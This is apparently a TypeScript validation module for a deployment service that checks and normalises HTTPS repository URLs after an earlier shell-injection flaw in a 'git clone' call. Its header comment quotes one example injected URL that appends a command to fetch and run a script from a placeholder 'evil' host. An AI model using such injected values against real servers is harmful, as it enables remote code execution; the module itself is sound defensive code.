/**
 * Validation for repository URLs before they ever reach a shell command.
 *
 * The deployer previously interpolated the raw URL into a `git clone` shell
 * string, so anything like `https://x/y;curl evil|sh` would run on the server.
 * Everything now goes through `execFile` with an argument array, and this module
 * rejects anything that does not look like a plain HTTPS repository URL.
 */

export class InvalidGitUrlError extends Error {
	constructor(message: string) {
		super(message);
		this.name = 'InvalidGitUrlError';
	}
}

const MAX_URL_LENGTH = 500;

/** eslint-disable-next-line no-control-regex */
const CONTROL_OR_SPACE = /[\s\u0000-\u001f\u007f]/;

export function parseGitUrl(raw: string): URL {
	const trimmed = (raw ?? '').trim();

	if (!trimmed) {
		throw new InvalidGitUrlError('A repository URL is required.');
	}

	if (trimmed.length > MAX_URL_LENGTH) {
		throw new InvalidGitUrlError('Repository URL is too long.');
	}

	if (CONTROL_OR_SPACE.test(trimmed)) {
		throw new InvalidGitUrlError('Repository URL cannot contain spaces or control characters.');
	}

	let url: URL;
	try {
		url = new URL(trimmed);
	} catch {
		throw new InvalidGitUrlError('Enter a valid repository URL, for example https://github.com/you/site');
	}

	if (url.protocol !== 'https:') {
		throw new InvalidGitUrlError('Only https:// repository URLs are supported.');
	}

	if (url.username || url.password) {
		throw new InvalidGitUrlError('Repository URLs cannot include credentials.');
	}

	if (url.port) {
		throw new InvalidGitUrlError('Repository URLs cannot include a port.');
	}

	if (!url.hostname.includes('.') || url.hostname.startsWith('.') || url.hostname.endsWith('.')) {
		throw new InvalidGitUrlError('Repository URL must point at a public host.');
	}

	if (url.pathname === '/' || url.pathname === '') {
		throw new InvalidGitUrlError('Repository URL must include the repository path.');
	}

	return url;
}

/** Canonical form stored in the database: no trailing slash, no `.git` suffix. */
export function normalizeGitUrl(raw: string): string {
	const url = parseGitUrl(raw);
	url.pathname = url.pathname.replace(/\.git$/i, '').replace(/\/+$/, '');
	url.search = '';
	url.hash = '';
	return url.toString().replace(/\/$/, '');
}

export interface GitHubRepoRef {
	owner: string;
	repo: string;
}

/** Returns the owner/repo pair for github.com URLs, null for anything else. */
export function parseGitHubRepo(raw: string): GitHubRepoRef | null {
	let url: URL;
	try {
		url = parseGitUrl(raw);
	} catch {
		return null;
	}

	const host = url.hostname.toLowerCase();
	if (host !== 'github.com' && host !== 'www.github.com') return null;

	const [owner, repo] = url.pathname.replace(/^\/+/, '').replace(/\.git$/i, '').split('/');
	if (!owner || !repo) return null;

	const safe = /^[A-Za-z0-9._-]+$/;
	if (!safe.test(owner) || !safe.test(repo)) return null;

	return { owner, repo };
}
